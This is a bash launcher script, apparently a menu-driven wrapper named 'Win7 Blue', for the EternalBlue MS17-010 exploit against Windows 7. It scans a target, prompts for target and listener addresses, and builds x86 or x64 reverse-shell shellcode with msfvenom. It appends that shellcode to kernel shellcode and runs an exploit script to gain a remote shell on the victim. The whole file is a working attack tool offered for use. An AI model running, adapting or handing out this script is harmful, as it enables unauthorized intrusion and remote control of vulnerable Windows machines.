#!/bin/bash

declare -r RED="\e[91m"
declare -r GREEN="\e[92m"
declare -r YELLOW="\e[93m"
declare -r BLUE="\e[34m"
declare -r BLUELIGHT="\e[94m"
declare -r WHITE="\e[97m"
declare -r END="\e[0m"

declare -r SHELL="$"
declare -r VAR1="1"
declare -r VAR2="2"
declare -r VAR3="3"
declare -r VAR4="4"
declare -r VAR5="Scan"
declare -r VAR6="Exploit"
declare -r VAR7="32 bits"
declare -r VAR8="64 bits"
declare -r VAR9="["
declare -r VAR10="]"
declare -r VAR11="+"
declare -r VAR12="--"
declare -r VAR13="Exit"
declare -r VAR14="¿"
declare -r VAR15="?"
declare -r VAR16="RHOST"
declare -r VAR17="LHOST"
declare -r VAR18="LPORT"
declare -r VAR19="Creating SHELLCODE with MSFVENOM"
declare -r VAR20="EternalBlue"
declare -r VAR21="MS17-010"
declare -r VAR22="i"
declare -r VAR23="x"
declare -r VAR24="checking root user"
declare -r VAR25="root"
declare -r VAR26="NO root"
declare -r VAR27="checking msfvenom installed"
declare -r VAR28="msfvenom"
declare -r VAR29="msfvenom not installed"
declare -r VAR30="Windows 7"
declare -r VAR31="Launching Exploit"

function banner(){
  echo ""
  echo -e "$BLUELIGHT┌═══════════════════════════════════┐$END"
  echo -e "$BLUELIGHT║$BLUE  ██╗    ██╗██╗███╗   ██╗███████╗  $BLUELIGHT║$END"
  echo -e "$BLUELIGHT║$BLUE  ██║    ██║██║████╗  ██║╚════██║  $BLUELIGHT║$END" 
  echo -e "$BLUELIGHT║$BLUE  ██║ █╗ ██║██║██╔██╗ ██║    ██╔╝  $BLUELIGHT║$END" 
  echo -e "$BLUELIGHT║$BLUE  ██║███╗██║██║██║╚██╗██║   ██╔╝   $BLUELIGHT║$END"  
  echo -e "$BLUELIGHT║$BLUE  ╚███╔███╔╝██║██║ ╚████║   ██║    $BLUELIGHT║$END"
  echo -e "$BLUELIGHT║$BLUE   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝    $BLUELIGHT║$END"   
  echo -e "$BLUELIGHT║$BLUE ██████╗ ██╗     ██╗   ██╗███████╗ $BLUELIGHT║$END"
  echo -e "$BLUELIGHT║$BLUE ██╔══██╗██║     ██║   ██║██╔════╝ $BLUELIGHT║$END"
  echo -e "$BLUELIGHT║$BLUE ██████╔╝██║     ██║   ██║█████╗   $BLUELIGHT║$END"  
  echo -e "$BLUELIGHT║$BLUE ██╔══██╗██║     ██║   ██║██╔══╝   $BLUELIGHT║$END" 
  echo -e "$BLUELIGHT║$BLUE ██████╔╝███████╗╚██████╔╝███████╗ $BLUELIGHT║$END"
  echo -e "$BLUELIGHT║$BLUE ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ $BLUELIGHT║$END"
  echo -e "$BLUELIGHT║$WHITE $VAR9$BLUE$VAR11$WHITE$VAR10  $GREEN$VAR20 $WHITE$VAR12 $GREEN$VAR21  $WHITE$VAR9$BLUE$VAR11$WHITE$VAR10 $BLUELIGHT║$END"
  echo -e "$BLUELIGHT└═══════════════════════════════════┘$END"
}

function main(){
  echo ""
  echo -e "$WHITE$VAR9$BLUE$VAR1$WHITE$VAR10 $GREEN$VAR5$END"
  echo -e "$WHITE$VAR9$BLUE$VAR2$WHITE$VAR10 $GREEN$VAR6 $WHITE$VAR30 $WHITE$VAR9$YELLOW$VAR7$WHITE$VAR10$END"
  echo -e "$WHITE$VAR9$BLUE$VAR3$WHITE$VAR10 $GREEN$VAR6 $WHITE$VAR30 $WHITE$VAR9$YELLOW$VAR8$WHITE$VAR10$END"
  echo -e "$WHITE$VAR9$BLUE$VAR4$WHITE$VAR10 $RED$VAR13$END"
  echo ""
}

function menu(){

read -p " $(echo -e $BLUE$SHELL $END)" opc

  if [ $opc -eq 1 ]; then
    echo ""
    echo -ne "$WHITE$VAR14$BLUE$VAR16$WHITE$VAR15$END "
    read rhost
    echo ""
    python2 eternalblue_scanner.py $rhost
    echo ""
    exit 0
  elif [ $opc -eq 2 ]; then
    echo ""
    echo -ne "$WHITE$VAR14$BLUE$VAR16$WHITE$VAR15$END "
    read rhost
    echo ""
    echo -ne "$WHITE$VAR14$BLUE$VAR17$WHITE$VAR15$END "
    read lhost
    echo ""
    echo -ne "$WHITE$VAR14$BLUE$VAR18$WHITE$VAR15$END "
    read lport
    echo ""
    rm -rf sc_x86_msf.bin
    rm -rf sc_x86.bin
    echo -e "$WHITE$VAR9$YELLOW$VAR22$WHITE$VAR10 $BLUE$VAR19$END"
    echo ""
    sleep 2
    msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
    sleep 1
    /usr/bin/cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
    echo -e "$WHITE$VAR9$GREEN$VAR11$WHITE$VAR10 $BLUE$VAR31$END"
    echo ""
    sleep 1
    python3 ms17_010_eternalblue.py $rhost sc_x86.bin
    exit 0
  elif [ $opc -eq 3 ]; then
    echo ""
    echo -ne "$WHITE$VAR14$BLUE$VAR16$WHITE$VAR15$END "
    read rhost
    echo ""
    echo -ne "$WHITE$VAR14$BLUE$VAR17$WHITE$VAR15$END "
    read lhost
    echo ""
    echo -ne "$WHITE$VAR14$BLUE$VAR18$WHITE$VAR15$END "
    read lport
    echo ""
    rm -rf sc_x64_msf.bin
    rm -rf sc_x64.bin
    echo -e "$WHITE$VAR9$YELLOW$VAR22$WHITE$VAR10 $BLUE$VAR19$END"
    echo ""
    sleep 2
    msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
    sleep 1
    /usr/bin/cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
    echo -e "$WHITE$VAR9$GREEN$VAR11$WHITE$VAR10 $BLUE$VAR31$END"
    echo ""
    sleep 1
    python3 ms17_010_eternalblue.py $rhost sc_x64.bin
    exit 0
  elif [ $opc -eq 4 ]; then
    echo ""
    exit 0
  else
    :
  fi
}

function start(){
  clear
  banner
  main
  menu
}

start
